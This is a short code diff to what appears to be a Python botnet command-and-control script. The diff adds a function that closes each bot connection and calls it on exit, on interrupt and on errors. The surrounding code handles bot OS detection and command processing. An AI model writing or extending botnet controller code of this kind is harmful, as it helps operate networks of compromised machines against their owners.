@@ -116,6 +116,15 @@ def detect_os():
         print(bot_os)
         print("\n\n\n\n")
 
+def shutdown_botnet():
+    global botnet
+    for bot in botnet:
+        try:
+            botnet[bot].close()
+            print("[*] Connection to %s closed"%(bot))
+        except:
+            pass
+
 def make_output_file(name,data):
     file = open(name+'.txt','w')
     file.write(data)
@@ -327,6 +336,7 @@ def process_cmd(cmd):
             #     pass
 
             if "exit" in cmd:
+                shutdown_botnet()
                 keep_alive = False
 
             else:
@@ -353,11 +363,13 @@ def main():
             command_thread.start()
     except KeyboardInterrupt:
         print("[*] Botnet Terminated!")
+        shutdown_botnet()
         #listener_thread.kill()
         sys.exit()
         quit()
     except Exception as ee:
         print("[*] Unknown Error Occured : %s"%(str(ee)))
+        shutdown_botnet()
 
 if __name__ == '__main__':
     main()
